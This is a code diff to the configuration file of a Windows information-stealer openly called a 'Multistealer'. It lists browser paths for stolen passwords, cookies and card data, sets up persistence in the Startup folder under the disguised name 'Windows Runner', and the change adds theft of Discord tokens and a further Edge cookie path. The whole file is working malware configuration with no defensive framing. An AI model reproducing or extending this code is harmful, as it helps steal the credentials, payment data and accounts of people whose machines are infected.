@@ -1,6 +1,12 @@
 from os import environ
-from win32api import GetUserName
 from dataclasses import dataclass
+
+from urllib3 import poolmanager
+from win32api import GetUserName
+
+
+user = GetUserName()
+http = poolmanager.PoolManager(timeout=5.0)
 
 
 @dataclass
@@ -15,12 +21,11 @@ class ChromiumConfig:
 @dataclass
 class MultistealerConfig:
 
-    User: str = GetUserName()
-    ZipName: str = f"{User}-st"
+    ZipName: str = f"{user}-st"
     StoragePath: str = rf"{environ['USERPROFILE']}\AppData"
     StorageFolder: str = "stink"
 
-    Functions: tuple = ("system", "screen", "cookies", "passwords", "processes", "cards")
+    Functions: tuple = ("system", "screen", "cookies", "passwords", "processes", "cards", "discord")
 
     ChromePaths: tuple = (
         rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State",
@@ -51,7 +56,7 @@ class MultistealerConfig:
         rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
         rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
         rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Web Data",
-        ""
+        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
     )
 
     BravePaths: tuple = (
@@ -66,7 +71,7 @@ class MultistealerConfig:
 @dataclass
 class SystemConfig:
 
-    User: str = GetUserName()
+    User: str = user
     Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
     IPUrl: str = "https://api.ipify.org/"
 
@@ -80,8 +85,14 @@ class SenderConfig:
 @dataclass
 class AutostartConfig:
 
-    User: str = GetUserName()
-    ExecutorPath: str = rf"C:\Users\{User}\AppData\Roaming\Microsoft\Windows"
+    ExecutorPath: str = rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows"
     AutostartName: str = "Windows Runner"
-    AutostartPath: str = rf"C:\Users\{User}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    AutostartPath: str = rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     Variables: tuple = ("executor_path", "statuses", "errors")
+
+
+@dataclass
+class DiscordConfig:
+
+    TokensPath: str = rf"C:\Users\{user}\AppData\Roaming\Discord\Local Storage\leveldb"
+    Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
